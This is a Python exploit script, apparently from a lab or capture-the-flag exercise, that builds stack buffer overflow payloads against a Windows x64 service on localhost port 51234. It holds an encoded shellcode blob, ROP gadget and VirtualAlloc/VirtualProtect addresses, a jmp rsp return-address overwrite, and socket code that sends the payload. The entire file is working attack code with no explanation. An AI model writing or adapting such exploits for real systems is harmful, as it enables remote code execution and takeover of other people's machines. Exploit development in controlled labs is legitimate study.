import socket
import struct

shellcode = b""
shellcode += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
shellcode += b"\x81\x76\x0e\x66\xed\x98\xc1\x83\xee\xfc\xe2\xf4"
shellcode += b"\x9a\x05\x1a\xc1\x66\xed\xf8\x48\x83\xdc\x58\xa5"
shellcode += b"\xed\xbd\xa8\x4a\x34\xe1\x13\x93\x72\x66\xea\xe9"
shellcode += b"\x69\x5a\xd2\xe7\x57\x12\x34\xfd\x07\x91\x9a\xed"
shellcode += b"\x46\x2c\x57\xcc\x67\x2a\x7a\x33\x34\xba\x13\x93"
shellcode += b"\x76\x66\xd2\xfd\xed\xa1\x89\xb9\x85\xa5\x99\x10"
shellcode += b"\x37\x66\xc1\xe1\x67\x3e\x13\x88\x7e\x0e\xa2\x88"
shellcode += b"\xed\xd9\x13\xc0\xb0\xdc\x67\x6d\xa7\x22\x95\xc0"
shellcode += b"\xa1\xd5\x78\xb4\x90\xee\xe5\x39\x5d\x90\xbc\xb4"
shellcode += b"\x82\xb5\x13\x99\x42\xec\x4b\xa7\xed\xe1\xd3\x4a"
shellcode += b"\x3e\xf1\x99\x12\xed\xe9\x13\xc0\xb6\x64\xdc\xe5"
shellcode += b"\x42\xb6\xc3\xa0\x3f\xb7\xc9\x3e\x86\xb2\xc7\x9b"
shellcode += b"\xed\xff\x73\x4c\x3b\x85\xab\xf3\x66\xed\xf0\xb6"
shellcode += b"\x15\xdf\xc7\x95\x0e\xa1\xef\xe7\x61\x12\x4d\x79"
shellcode += b"\xf6\xec\x98\xc1\x4f\x29\xcc\x91\x0e\xc4\x18\xaa"
shellcode += b"\x66\x12\x4d\x91\x36\xbd\xc8\x81\x36\xad\xc8\xa9"
shellcode += b"\x8c\xe2\x47\x21\x99\x38\x0f\xab\x63\x85\x58\x69"
shellcode += b"\x67\x4f\xf0\xc3\x66\xf6\xa1\x48\x80\x87\x88\x97"
shellcode += b"\x31\x85\x01\x64\x12\x8c\x67\x14\xe3\x2d\xec\xcd"
shellcode += b"\x99\xa3\x90\xb4\x8a\x85\x68\x74\xc4\xbb\x67\x14"
shellcode += b"\x0e\x8e\xf5\xa5\x66\x64\x7b\x96\x31\xba\xa9\x37"
shellcode += b"\x0c\xff\xc1\x97\x84\x10\xfe\x06\x22\xc9\xa4\xc0"
shellcode += b"\x67\x60\xdc\xe5\x76\x2b\x98\x85\x32\xbd\xce\x97"
shellcode += b"\x30\xab\xce\x8f\x30\xbb\xcb\x97\x0e\x94\x54\xfe"
shellcode += b"\xe0\x12\x4d\x48\x86\xa3\xce\x87\x99\xdd\xf0\xc9"
shellcode += b"\xe1\xf0\xf8\x3e\xb3\x56\x68\x74\xc4\xbb\xf0\x67"
shellcode += b"\xf3\x50\x05\x3e\xb3\xd1\x9e\xbd\x6c\x6d\x63\x21"
shellcode += b"\x13\xe8\x23\x86\x75\x9f\xf7\xab\x66\xbe\x67\x14"

# buff[1536]
# copies 2048

# 00007ffe`b89dc470 - virtualprotect

# 0x0000000140001002 : pop rsi ; ret
# 0x00007ffeb89dc470 : kernelbase!virtualprotect
# 0x00007ffeb89c4220 KERNELBASE!VirtualAlloc (void)
payload = (
    b'q' +
    b'A' * 1591 +
    struct.pack('<Q', 0x00007ff61bdd1001) +
    struct.pack('<Q', 0x00007ffeb89c4220) +
    b"\x90" * 10 + 
    b'C' * 500
)


# 00007ff6`1bdd1014 jmp rsp
badload = (
    b'q' +
    b'A' * 1591 +
    struct.pack('<Q', 0x00007ff61bdd1014) + 
    b"\x90" * 10 + 
    shellcode
)






def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect(("localhost", 51234))
        print(sock.recv(8))
        print(sock.recv(8))
        sock.send(payload)
    return

if __name__ == "__main__":
    main()